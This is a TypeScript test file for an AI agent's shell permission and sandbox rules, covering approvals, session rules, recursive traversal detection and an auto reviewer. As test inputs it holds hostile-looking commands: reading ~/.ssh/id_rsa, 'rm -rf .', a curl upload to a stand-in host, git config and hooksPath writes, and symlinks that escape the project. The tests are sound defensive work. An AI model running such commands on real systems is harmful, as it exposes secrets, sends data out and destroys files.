import "../../__tests__/support/trusted-powershell.js";
import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
import { setReviewerForTest } from "../../__tests__/support/reviewer-judge.js";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionManager } from "../permission-manager.js";
import { ApprovalGate, type ApprovalRequest } from "../approval-gate.js";
import { __resetActiveSandboxCapabilityForTest, __resetSandboxRequestedAtBootForTest, getHostShellExecutionPlan, setActiveSandboxCapability, setShellSandboxRequestedAtBoot } from "../sandbox-capability.js";
import { approvalCacheKeyIdentity, canonicalStringify, captureApprovalWorkingDirectory, lookupApproval, recordApproval, __resetSessionStoreForTest } from "../user-approval-store.js";
import { runWithToolExecutionCwd } from "../../tools/execution-context.js";
import { ToolExecutor } from "../../tools/executor.js";
import { ToolRegistry } from "../../tools/registry.js";
import { BashTool } from "../../tools/shell-tools.js";
import { userPermissionContext } from "../../tools/__tests__/tool-context-fixture.js";
import { VerdictCache } from "../reviewer/verdict-cache.js";
import { makeRecentlyDeniedStore } from "../../__tests__/support/recently-denied.js";
import { AuditLogger } from "../../audit/audit-logger.js";
import { flushSandboxAudit } from "../../audit/sandbox-audit-sink.js";
import { buildHostShellExecutionPlan } from "../host-shell-execution-plan.js";
import { mxcShellCapability, windowsProxyOnlyCapability } from "../../boot/steps/windows-sandbox-plan.js";
import { definitelyTraversesPowerShellRecursively, mayTraversePowerShellRecursively } from "../rules/powershell-exfiltration.js";
import { NO_APPROVER_MESSAGE } from "../decision-pipeline.js";
import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";

let root: string;
let dir: string;
let manager: PermissionManager;
// Audit writes are queued, not awaited, by the code under test; teardown must
// drain them before removing the directory they write into.
const auditLoggers: AuditLogger[] = [];
beforeEach(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "shell-sandbox-rules-")));
  dir = join(root, "project");
  mkdirSync(dir);
  const home = join(root, "home");
  mkdirSync(home);
  vi.stubEnv("HOME", home);
  vi.stubEnv("USERPROFILE", home);
  vi.stubEnv("AVE_HOME", join(root, "state"));
  manager = new PermissionManager(join(root, "permissions.json"));
  manager.setMode("default");
  setShellSandboxRequestedAtBoot(true);
  setActiveSandboxCapability({ kind: "asrt", confidence: "verified", platform: process.platform, reason: "fixture full shell containment", confines: { filesystem: true, process: true, network: true } });
});
afterEach(async () => {
  await Promise.all(auditLoggers.splice(0).map((logger) => logger.close()));
  await flushSandboxAudit();
  __resetSessionStoreForTest();
  __resetActiveSandboxCapabilityForTest();
  __resetSandboxRequestedAtBootForTest();
  vi.unstubAllEnvs();
  rmSync(root, { recursive: true, force: true });
});

function check(command: string, runsSandboxed: boolean, extra: { headless?: boolean; sessionId?: string } = {}) {
  return manager.checkDetailed("bash", "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect: "bash", command, cwd: dir },
    shellExecution: { runsSandboxed },
    ...extra,
  });
}

describe("shell confinement and escape rules", () => {
  it("auto-allows a confined call and asks for the same plain call", () => {
    expect(check("printf ready", true)).toMatchObject({ decision: "allow" });
    expect(check("printf ready", false)).toMatchObject({ decision: "ask" });
    manager.setRules(([{ pattern: "Bash(printf ready)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    expect(check("printf ready", false)).toMatchObject({ decision: "allow" });
  });

  it.each(["strict", "default", "auto", "allow"] as const)("honors prefix and tool rules before host mode policy in %s mode", (mode) => {
    manager.setMode(mode);
    manager.setRules(([{ pattern: "Bash(printf *)", action: "allow" }, { pattern: "bash", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    expect(check("printf ready", false)).toMatchObject({ decision: "allow" });
    manager.setRules(([{ pattern: "Bash(printf ready)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    expect(check("printf ready", false)).toMatchObject({ decision: "allow" });
    const other = check("printf other", false);
    expect(other.forceModal).toBeUndefined();
    expect(other.decision).toBe(mode === "allow" ? "allow" : "ask");
    expect(other.reviewer).toEqual(mode === "auto" ? { route: "foreground-auto" } : undefined);
  });

  it("keeps a prefix rule for a confined call", () => {
    manager.setRules(([{ pattern: "Bash(printf *)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    expect(check("printf ready", true)).toMatchObject({ decision: "allow" });
  });

  it("honors a headless host prefix rule and denies an unmatched default-mode call", () => {
    manager.setRules(([{ pattern: "Bash(printf *)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    expect(check("printf ready", false, { headless: true })).toMatchObject({ decision: "allow" });
    expect(check("echo other", false, { headless: true })).toMatchObject({ decision: "deny", reason: NO_APPROVER_MESSAGE });
    expect(check("echo other", false, { headless: true }).reviewer).toBeUndefined();
  });

  it("applies an edited wildcard session rule to both host and sandboxed calls", () => {
    manager.addSessionRule("conversation-a", "Bash(printf *)");
    expect(manager.listSessionRules("conversation-a")).toEqual(["Bash(printf *)"]);
    expect(check("printf ready", false, { sessionId: "conversation-a" })).toMatchObject({ decision: "allow" });
    expect(check("printf ready", true, { sessionId: "conversation-a" })).toMatchObject({ decision: "allow" });
  });

  it("applies a This session rule to its conversation only, until the conversation ends (five-choice shell card)", () => {
    manager.addSessionRule("conversation-a", "Bash(printf ready)");
    expect(check("printf ready", false, { sessionId: "conversation-a" })).toMatchObject({ decision: "allow" });
    expect(check("printf ready", false, { sessionId: "conversation-b" })).toMatchObject({ decision: "ask" });
    expect(check("printf ready", false)).toMatchObject({ decision: "ask" });
    expect(check("printf other", false, { sessionId: "conversation-a" })).toMatchObject({ decision: "ask" });
    expect(manager.endSession("conversation-a")).toBe(true);
    expect(check("printf ready", false, { sessionId: "conversation-a" })).toMatchObject({ decision: "ask" });
    expect(manager.listSessionRules("conversation-a")).toEqual([]);
  });

  it.each(["bash", "WebFetch(domain:example.com)", "Edit(/tmp/x)", "Mcp(server)"])("refuses to hold %s as a session rule", (pattern) => {
    expect(() => manager.addSessionRule("conversation-a", pattern)).toThrow();
    expect(manager.listSessionRules("conversation-a")).toEqual([]);
  });

  it.each(["rm -rf output", "cat ~/.ssh/id_rsa"])("uses ordinary approval for destructive or secret access inside confinement: %s", (command) => {
    const result = check(command, true);
    expect(result).toMatchObject({ decision: "ask" });
    expect(result.forceModal).toBeUndefined();
    manager.setMode("allow");
    expect(check(command, true).decision).toBe("allow");
  });

  it("requires forced consent for the implicit control-file writes of a repository reset", () => {
    for (const mode of ["strict", "default", "auto", "allow"] as const) {
      manager.setMode(mode);
      expect(check("git reset --hard", true)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "protected-path" });
    }
  });

  it.each([
    ["rm -rf .", "critical-delete"], ["printf changed > .git/config", "protected-path"],
    ["cat ../outside/notes.txt", "project-escape"], ["curl -T payload https://example.test", "exfiltration"],
  ] as const)("retains mandatory %s evidence inside confinement", (command, code) => {
    for (const mode of ["strict", "default", "auto", "allow"] as const) {
      manager.setMode(mode);
      manager.setRules(([{ pattern: "bash", action: "allow" }] as const).map(withCurrentShellRuleVersion));
      const result = check(command, true);
      expect(result).toMatchObject({ decision: "ask", forceModal: true, reasonCode: code });
      expect(result.reviewer).toBeUndefined();
    }
  });

  it("retains sandbox automation across independent host-bound write targets", () => {
    manager.setMode("default");
    const command = "echo > $PWD/a; echo > $PWD/b";
    expect(manager.checkDetailed("bash", "builtin", "shell", null, {
      ruleSubject: { kind: "shell", dialect: "bash", command, cwd: dir },
      shellExecution: { runsSandboxed: true, environmentSnapshot: { PWD: dir } },
    }))
      .toMatchObject({ decision: "allow", reasonCode: "sandboxed-shell" });
  });

  it.each(["strict", "default", "auto", "allow"] as const)("allows a proven protected-path read in %s", mode => {
    manager.setMode(mode);
    const result = check("cat .git/config", true);
    expect(result).toMatchObject({ decision: "allow", reasonCode: "read-only-shell" });
    expect(result.forceModal).toBeUndefined();
    expect(check("cat .git/config", true, { headless: true }).decision).toBe("allow");
  });

  it.each([
    { route: "an ASRT plan confining the filesystem", expected: { decision: "allow", reasonCode: "read-only-shell" },
      plan: () => buildHostShellExecutionPlan({ platform: "linux", requestedSandbox: true, activeCapability: { kind: "asrt", confidence: "verified", platform: "linux", reason: "fixture full shell containment", confines: { filesystem: true, process: true, network: true } } }) },
    // Runtime confinement remains responsible for descendants not present in the command operands.
    { route: "the MXC container route", expected: { decision: "allow", reasonCode: "read-only-shell" },
      plan: () => buildHostShellExecutionPlan({ platform: "win32", requestedSandbox: true, activeCapability: mxcShellCapability(), shellSubstrate: "mxc" }) },
    // A host shell follows ordinary mode policy even when the command is read-only.
    { route: "the approved-host route", expected: { decision: "ask", reasonCode: "shell-approval" },
      plan: () => buildHostShellExecutionPlan({ platform: "win32", requestedSandbox: true, activeCapability: windowsProxyOnlyCapability() }) },
  ])("decides recursive link traversal without a visible sensitive path from $route", ({ plan, expected }) => {
    const clean = join(dir, "clean");
    mkdirSync(clean);
    mkdirSync(join(process.env.HOME!, ".ssh"));
    writeFileSync(join(process.env.HOME!, ".ssh", "id_rsa"), "fixture");
    symlinkSync(join(process.env.HOME!, ".ssh"), join(clean, "linked"), "junction");
    const hostShellExecutionPlan = plan();
    const result = manager.checkDetailed("bash", "builtin", "shell", null, {
      ruleSubject: { kind: "shell", dialect: "bash", command: `grep --dereference-recursive term '${clean.replace(/\\/g, "/")}'`, cwd: dir },
      hostShellExecutionPlan,
      shellExecution: { runsSandboxed: hostShellExecutionPlan.sandboxed },
    });
    expect(result).toMatchObject(expected);
    expect(result.forceModal).toBeUndefined();
  });

  describe("PowerShell on the MXC route", () => {
    const checkPowerShell = (command: string, headless = false) => {
      const hostShellExecutionPlan = buildHostShellExecutionPlan({ platform: "win32", requestedSandbox: true, activeCapability: mxcShellCapability(), shellSubstrate: "mxc" });
      return manager.checkDetailed("powershell", "builtin", "shell", null, {
        ruleSubject: { kind: "shell", dialect: "powershell", command, cwd: dir },
        hostShellExecutionPlan,
        shellExecution: { runsSandboxed: hostShellExecutionPlan.sandboxed },
        headless,
      });
    };
    it("routes uncertain traversal to ordinary approval and keeps known-safe read proof", () => {
      const uncertain = checkPowerShell("node walker.js src");
      expect(uncertain).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
      expect(uncertain.forceModal).toBeUndefined();
      expect(checkPowerShell("rg term")).toMatchObject({ decision: "allow", reasonCode: "read-only-shell" });
      for (const command of ["Get-ChildItem", "gci", "dir", "Get-ChildItem -Path src -Recurse -Depth 2", "gci -LiteralPath src -File", "dir -Filter *.ts -Force"]) {
        manager.setMode("strict");
        expect(checkPowerShell(command), command).toMatchObject({ decision: "allow", reasonCode: "read-only-shell" });
      }
    });

    it.each([
      "Get-ChildItem -Recurse src", "gci -r src", "ls -Rec src", "dir -recurs src", "Get-ChildItem src -s",
      "Get-ChildItem src -Depth 2", "gci src -de 1", "Get-ChildItem src -Recurse:$true",
      "gci -d 1 src", "tar --cr x.tar src", "tar --ap x.tar src", "tar --up x.tar src",
      "findstr /si term src", "findstr -si term src", "findstr /s/i term src", "findstr -s term src",
      "findstr -sic:probe src", "findstr /sic:probe src", "xcopy src out /s/d:01-01-2020",
      "xcopy src out /se", "xcopy src out /s/e", "xcopy src out /t",
      "xcopy src out /s/m", "xcopy src out /e/d", "xcopy src out /e/x", "xcopy src out /s/-y", "findstr /s/offline term src",
      "tar --lz4 -cf out.tar src", "tar --verb -czf out.tgz src", "tar --bzip2 -cf out.tbz src", "zip -r:$x a.zip src",
      "tar --file -t -c src", "tar --lz4 --file -t -c src", "tar -f -t -c src",
      "robocopy src out -s", "robocopy src out -e", "robocopy src out -mir",
      "Get-ChildItem -r src | Select-String term", "Select-String term -Path (Get-ChildItem -Recurse src)",
      "if ($true) { gci -Recurse src }", "$files = gci -r src; Select-String term $files",
      "Remove-Item -Recurse build", "Copy-Item src out -Recurse", "robocopy src out /E",
      "tar cf x.tar d", "tar -czf x.tar d", "tar --create -f x.tar d", "tar -rf x.tar d", "tar -uf x.tar d", "& tar c .",
      "7z a x.7z d", "7za u x.7z d", "zip -r a.zip d", "zip -qr a.zip d",
      "Compress-Archive -Path d/ -DestinationPath a.zip", "Compress-Archive *.txt a.zip", "Compress-Archive -Path:src/* a.zip",
    ])("keeps definite traversal %s as ordinary mode evidence", command => {
      expect(definitelyTraversesPowerShellRecursively(command)).toBe(true);
      expect(mayTraversePowerShellRecursively(command)).toBe(true);
      const result = checkPowerShell(command);
      const staticGrammar = ["Get-ChildItem -Recurse src", "Get-ChildItem src -Depth 2", "Copy-Item src out -Recurse"].includes(command);
      const staticConfined = staticGrammar && process.platform !== "win32";
      const readOnlyListing = ["Get-ChildItem -Recurse src", "Get-ChildItem src -Depth 2"].includes(command);
      expect(result).toMatchObject(readOnlyListing ? { decision: "allow", reasonCode: "read-only-shell" } : staticConfined
        ? { decision: "allow", reasonCode: "sandboxed-shell" }
        : { decision: "ask", reasonCode: "shell-approval" });
      if (staticGrammar) expect(result.pipelineRequest?.shell).toMatchObject({
        sandboxed: true, readOnlyProven: readOnlyListing,
        unproven: readOnlyListing ? false : !staticConfined, destructive: false,
      });
      expect(result.forceModal).toBeUndefined();
      expect(result.pipelineRequest?.floor).toBeUndefined();
      manager.setMode("allow");
      expect(checkPowerShell(command).decision).toBe("allow");
    });

    it.each([
      "tree src", "rg term", "node walker.js src", "cmd /c dir /s", "iex 'Get-ChildItem'", "& $cmd src",
      "Get-ChildItem @options", "Get-ChildItem 'unterminated",
      "zip $flags a.zip d", "Compress-Archive src a.zip", "Compress-Archive -Path $p a.zip",
      "tar --c x.tar", "tar --a x.tar", "tar --u x.tar", "tar --lz4 -t -f x.tar",
      "xcopy src out /s/d:$date", "findstr /s/c:$needle notes.txt",
      "findstr --% /s term src", "7z b x.7z", "7z d x.7z", "7z h x.7z", "7z i x.7z", "7z rn x.7z", "7z unknown x.7z",
    ])("uses ordinary mode policy for undecidable traversal %s", command => {
      expect(definitelyTraversesPowerShellRecursively(command)).toBe(false);
      expect(mayTraversePowerShellRecursively(command)).toBe(true);
      const result = checkPowerShell(command);
      expect(result.decision).toBe(command === "rg term" ? "allow" : "ask");
      expect(result.forceModal).toBeUndefined();
      manager.setMode("allow");
      expect(checkPowerShell(command).decision).toBe("allow");
    });

    it.each(["tar $mode x.tar", "tar @flags x.tar", "7z $op x.7z", "xcopy $from out",
      "robocopy src out $flags", "robocopy --% a b /e", "xcopy --% a b /s", "$env:X='/e'; robocopy --% a b %X%"])("forces possibly protected mutation targets in %s", command => {
      expect(definitelyTraversesPowerShellRecursively(command)).toBe(false);
      expect(mayTraversePowerShellRecursively(command)).toBe(true);
      for (const mode of ["strict", "default", "auto", "allow"] as const) {
        manager.setMode(mode);
        expect(checkPowerShell(command)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "protected-path" });
        expect(checkPowerShell(command, true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
      }
    });

    // Listing and extraction read the archive, not a tree; extraction writes belong to the write policy.
    it.each(["tar -tf x.tar", "tar -xf x.tar", "tar xf x.tar", "7z l x.7z", "7z x x.7z", "7z e x.7z", "7z t x.7z", "unzip x.zip", "Expand-Archive x.zip d"])
    ("does not deny archive listing or extraction %s as traversal", command => {
      expect(definitelyTraversesPowerShellRecursively(command)).toBe(false);
      expect(mayTraversePowerShellRecursively(command)).toBe(false);
      expect(checkPowerShell(command).decision).not.toBe("deny");
    });

    it.each(["Get-ChildItem src", "Get-ChildItem -Directory src", "Get-Content notes.txt", "Select-String term notes.txt",
      "gci -ad src", "gc notes.txt -re 10", "gc f.csv -De ','", "xcopy src out -s", "xcopy src out /exclude:s", "robocopy src out /se", "findstr /c:s term src",
      "xcopy src out /exclude:C:/lists/exclude.txt", "findstr /c:a/s notes.txt", "findstr /d:C:/src needle notes.txt",
      "xcopy src out /noclone", "xcopy src out /sparse", "xcopy src out /-sparse", "findstr /off term notes.txt",
      "Copy-Item src -De out", "Remove-Item src -d",
      "$a = 1; Write-Output $a", "foreach ($n in 1..3) { Write-Output $n }", "Copy-Item -Recurse:$false src out",
      "Get-ChildItem -Recurse: $false src"])("treats %s as flat", command => {
      expect(mayTraversePowerShellRecursively(command)).toBe(false);
      expect(definitelyTraversesPowerShellRecursively(command)).toBe(false);
    });
  });

  describe("definite PowerShell recursion on every host route", () => {
    const routes = {
      mxc: () => buildHostShellExecutionPlan({ platform: "win32", requestedSandbox: true, activeCapability: mxcShellCapability(), shellSubstrate: "mxc" }),
      asrt: () => buildHostShellExecutionPlan({ platform: "linux", requestedSandbox: true, activeCapability: { kind: "asrt", confidence: "verified", platform: "linux", reason: "fixture full shell containment", confines: { filesystem: true, process: true, network: true } } }),
      "approved host": () => buildHostShellExecutionPlan({ platform: "win32", requestedSandbox: true, activeCapability: windowsProxyOnlyCapability() }),
    };
    const forms = (operand: string) => [
      `Get-ChildItem -Recurse '${operand}'`, `gci -r '${operand}'`, `gci -s '${operand}'`, `Get-ChildItem -Depth 2 '${operand}'`,
      `Copy-Item -Recurse:$true '${operand}' out`, `gci -r '${operand}' | Select-String x`,
    ];

    it.each(Object.keys(routes) as (keyof typeof routes)[])("forces fresh approval for an escaping junction or directory link on the %s route", (route) => {
      const outside = join(root, "outside");
      mkdirSync(outside);
      writeFileSync(join(outside, "notes.txt"), "fixture");
      const junction = join(dir, "via-junction");
      const directoryLink = join(dir, "via-link");
      symlinkSync(outside, junction, "junction");
      symlinkSync(outside, directoryLink, "dir");
      const hostShellExecutionPlan = routes[route]();
      for (const link of [junction, directoryLink]) {
        for (const command of forms(link.replace(/\\/g, "/"))) {
          expect(manager.checkDetailed("powershell", "builtin", "shell", null, {
            ruleSubject: { kind: "shell", dialect: "powershell", command, cwd: dir },
            hostShellExecutionPlan,
            shellExecution: { runsSandboxed: hostShellExecutionPlan.sandboxed, pathPolicyRelaxations: [] },
          }), command).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "project-escape" });
        }
      }
    });
  });

  it("keeps ordinary commands and wildcard allows unchanged on the MXC route", () => {
    const plans = {
      mxc: buildHostShellExecutionPlan({ platform: "win32", requestedSandbox: true, activeCapability: mxcShellCapability(), shellSubstrate: "mxc" }),
      asrt: buildHostShellExecutionPlan({ platform: "linux", requestedSandbox: true, activeCapability: { kind: "asrt", confidence: "verified", platform: "linux", reason: "fixture full shell containment", confines: { filesystem: true, process: true, network: true } } }),
    };
    const checkOn = (route: keyof typeof plans, command: string) => manager.checkDetailed("bash", "builtin", "shell", null, {
      ruleSubject: { kind: "shell", dialect: "bash", command, cwd: dir },
      hostShellExecutionPlan: plans[route],
      shellExecution: { runsSandboxed: plans[route].sandboxed },
    });
    for (const command of ["printf ready", "grep term notes.txt", "ls -la"]) {
      expect(checkOn("mxc", command)).toMatchObject({ decision: "allow", reasonCode: "read-only-shell" });
      expect(checkOn("mxc", command)).toEqual(checkOn("asrt", command));
    }
    manager.setRules(([{ pattern: "Bash(printf *)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    expect(checkOn("mxc", "printf other")).toMatchObject({ decision: "allow" });
    expect(checkOn("mxc", "printf other")).toEqual(checkOn("asrt", "printf other"));
    expect(checkOn("mxc", "env grep -R term .")).toMatchObject({ decision: "allow", reasonCode: "read-only-shell" });
    expect(checkOn("mxc", "env grep -R term ../outside")).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "project-escape" });
  });

  it("keeps a runtime-selected runner prefix unproven inside confinement", () => {
    const result = check("npm --prefix $project run build", true);
    expect(result).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
    expect(result.forceModal).toBeUndefined();
  });

  it("keeps deny and ask ahead of confinement and covering allows", () => {
    manager.setRules(([{ pattern: "Bash(printf *)", action: "allow" }, { pattern: "Bash(printf ready)", action: "ask" }] as const).map(withCurrentShellRuleVersion));
    expect(check("printf ready", true)).toMatchObject({ decision: "ask", reasonCode: "rule-ask" });
    expect(check("printf ready", true).forceModal).toBeUndefined();
    manager.setRules(([{ pattern: "Bash(printf *)", action: "allow" }, { pattern: "Bash(printf ready)", action: "ask" }, { pattern: "Bash(printf *)", action: "deny" }] as const).map(withCurrentShellRuleVersion));
    expect(check("printf ready", true)).toMatchObject({ decision: "deny" });
  });

  it("routes an unresolved host call to the auto reviewer while confined safe reads remain automatic", () => {
    manager.setMode("auto");

    const result = check("printf ready", false);
    expect(result).toMatchObject({ decision: "ask" });
    expect(result.reviewer).toEqual({ route: "foreground-auto" });
    expect(result.forceModal).toBeUndefined();
    expect(check("printf ready", true).reviewer).toBeUndefined();
  });
});

function executorWithDock(options: { executionMode?: "host" | "sandbox"; headless?: boolean } = {}) {
  const registry = new ToolRegistry();
  registry.register(new BashTool());
  const requests: ApprovalRequest[] = [];
  let gate: ApprovalGate;
  const send = vi.fn((channel: string, request: ApprovalRequest) => {
    if (channel !== "ave:approval:request") return;
    requests.push(request);
    gate.resolveFromDesktopRenderer(request.id, { requestId: request.id, choice: "allow-once", nonce: request.nonce, hmac: request.hmac }, nativeWebContents as never);
  });
  const nativeWebContents = { isDestroyed: () => false, send };
  gate = new ApprovalGate(nativeWebContents as never);
  const auditLogger = new AuditLogger();
  auditLoggers.push(auditLogger);
  const executor = new ToolExecutor(registry, undefined, manager, undefined, gate, undefined, auditLogger);
  const executionMode = options.executionMode ?? "host";
  const input = executionMode === "host"
    ? { command: "printf ready", executionMode, justification: "Read the host environment" }
    : { command: "printf ready" };
  const permissionContext = options.headless === true ? { ...userPermissionContext(), headless: true } : userPermissionContext();
  const run = () => runWithToolExecutionCwd(dir, () => executor.executeAll([{ id: "retry", name: "bash", input }], { sessionId: "conversation", permissionContext }));
  return { run, requests, input, send };
}

describe("plain-shell invocation authorization", () => {
  it("reuses exact session approval for a host retry and keeps subsequent calls sandboxed", async () => {
    const { run, requests } = executorWithDock();
    const planBefore = getHostShellExecutionPlan();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    const request = requests[0]!;
    const args = canonicalStringify(request.args);
    const identity = approvalCacheKeyIdentity(request.approvalCacheKey, request.approvalMemory);
    await recordApproval("bash", args, "builtin", { scope: "session", verdictAtApproval: "high", nlJustification: null, trustOrigin: request.trustOrigin, approvalCacheKey: identity, sessionId: "conversation", workingDirectoryIdentity: captureApprovalWorkingDirectory(dir).identity });
    // Prove this legacy session entry matches the next call's complete identity.
    expect(await lookupApproval("bash", args, "builtin", request.trustOrigin, identity, dir, "conversation")).not.toBeNull();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toHaveLength(1);
    // Ordinary host approval may be remembered for the exact authorized input.
    expect(requests[0]?.shellRule).toMatchObject({ exactRule: "Bash(printf ready)", sessionAllowed: true, persistentAllowed: true });
    expect(requests[0]).not.toHaveProperty("shellExecution");
    expect(requests.every((request) => request.executionPlan?.mode === "plain")).toBe(true);
    expect(getHostShellExecutionPlan().mode).toBe(planBefore.mode);
    expect(check("printf later", true).decision).toBe("allow");
  });

  it("uses prefix and exact rules for host spawns while unmatched commands still ask", async () => {
    manager.setRules(([{ pattern: "Bash(printf *)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    const { run, requests, input } = executorWithDock();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toHaveLength(0);
    manager.setRules(([{ pattern: "Bash(printf ready)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toHaveLength(0);
    input.command = "printf other";
    expect((await run())[0]).toMatchObject({ content: "other" });
    expect(requests).toHaveLength(1);
  });

  it("asks for an explicit host request while the sandbox is unavailable, until an exact rule approves it", async () => {
    __resetActiveSandboxCapabilityForTest();
    const { run, requests } = executorWithDock();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    // The ordinary host card offers reusable command rules.
    expect(requests[0]?.shellRule).toMatchObject({ exactRule: "Bash(printf ready)", sessionAllowed: true, persistentAllowed: true });
    expect(requests[0]).not.toHaveProperty("shellExecution");
    await manager.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "user" });
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toHaveLength(1);
  });

  it("uses an exact rule when the sandbox is unavailable", async () => {
    __resetActiveSandboxCapabilityForTest();
    manager.setRules(([{ pattern: "Bash(printf ready)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    const { run, requests } = executorWithDock();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toEqual([]);
  });

  function lowReviewer() {
    manager.setMode("auto");

    const classifier = { classify: vi.fn(async (): Promise<{ level: "low" | "high"; reason: string }> => ({ level: "low", reason: "bounded host effect" })) };
    const cache = new VerdictCache(join(dir, "review-cache.jsonl"));
    setReviewerForTest(manager, { classifier, cache, recentlyDenied: makeRecentlyDeniedStore(join(dir, "deferred.jsonl")) });
    return { classifier, cache };
  }

  it.each(["low", "high"] as const)("reviews an unavailable-sandbox host call before the %s outcome", async (level) => {
    setActiveSandboxCapability({ kind: "none", confidence: "verified", platform: process.platform, reason: "fixture sandbox unavailable" });
    const { classifier, cache } = lowReviewer();
    classifier.classify.mockImplementation(async () => ({ level, reason: level === "high" ? "ambiguous host effect" : "bounded host effect" }));
    try {
      const { run, requests } = executorWithDock({ executionMode: "sandbox" });
      expect((await run())[0]).toMatchObject({ content: "ready" });
      expect(classifier.classify).toHaveBeenCalledOnce();
      expect(requests).toHaveLength(level === "high" ? 1 : 0);
      expect(requests.every((request) => request.executionPlan?.mode === "plain")).toBe(true);
      expect(requests.every((request) => request.allowedChoices === undefined)).toBe(true);
    } finally { await cache.flush(); }
  });

  it("allows a low reviewer verdict to authorize an explicit host request", async () => {
    const { classifier, cache } = lowReviewer();
    try {
      const { run, requests } = executorWithDock();
      const [result] = await run();
      expect(result).toMatchObject({ content: "ready", executionPlan: { mode: "plain", executionRequest: "host" } });
      expect(classifier.classify).toHaveBeenCalledOnce();
      expect(requests).toHaveLength(0);
    } finally { await cache.flush(); }
  });

  it("denies an unmatched headless default-mode host request without consulting the reviewer", async () => {
    const { classifier, cache } = lowReviewer();
    manager.setMode("default");
    try {
      const { run, requests, send } = executorWithDock({ headless: true });
      const [result] = await run();
      expect(result).toMatchObject({ is_error: true, content: expect.stringContaining(NO_APPROVER_MESSAGE) });
      expect(requests).toEqual([]);
      expect(send).not.toHaveBeenCalledWith("ave:approval:request", expect.anything());
      expect(classifier.classify).not.toHaveBeenCalled();
    } finally { await cache.flush(); }
  });

  it("runs a headless explicit host request on its exact rule, without asking", async () => {
    manager.setRules(([{ pattern: "Bash(printf ready)", action: "allow" }] as const).map(withCurrentShellRuleVersion));
    const { classifier, cache } = lowReviewer();
    try {
      const { run, requests, send } = executorWithDock({ headless: true });
      const [result] = await run();
      expect(result).toMatchObject({ content: "ready" });
      expect(result?.is_error).toBeUndefined();
      expect(result?.executionPlan).toMatchObject({ executionRequest: "host", mode: "plain" });
      expect(requests).toEqual([]);
      expect(send).not.toHaveBeenCalledWith("ave:approval:request", expect.anything());
      expect(classifier.classify).not.toHaveBeenCalled();
    } finally { await cache.flush(); }
  });
});

describe("protected write evidence budget", () => {
  it.each(["strict", "default", "auto", "allow"] as const)("denies actual evidence parser exhaustion before mode or a card in %s", (mode) => {
    manager.setMode(mode);
    const command = " ".repeat(SHELL_ANALYSIS_LIMITS.sourceBytes + 1) + "git config core.hooksPath /tmp";
    for (const headless of [false, true]) {
      const result = check(command, true, { headless });
      expect(result).toMatchObject({ decision: "deny", reasonCode: "shell-analysis-limit" });
      expect(result.forceModal).toBeUndefined();
      expect(result.reviewer).toBeUndefined();
    }
  });
});

describe("ordinary sandbox rows after literal screening", () => {
  it.each(["strict", "default", "auto", "allow"] as const)("preserves project redirection and repository inspection in %s", mode => {
    manager.setMode(mode);
    expect(check("echo x > out.txt", true)).toMatchObject(mode === "strict"
      ? { decision: "ask", reasonCode: "shell-approval" }
      : { decision: "allow", reasonCode: "sandboxed-shell" });
    expect(check("git status", true)).toMatchObject({ decision: "allow", reasonCode: "read-only-shell" });
  });
});

describe("command language proof isolation", () => {
  it.each(["Get-ChildItem", "gci", "dir"])("does not treat a matching native program name as a read-only cmdlet: %s", command => {
    manager.setMode("strict");
    expect(check(command, true)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
  });
});
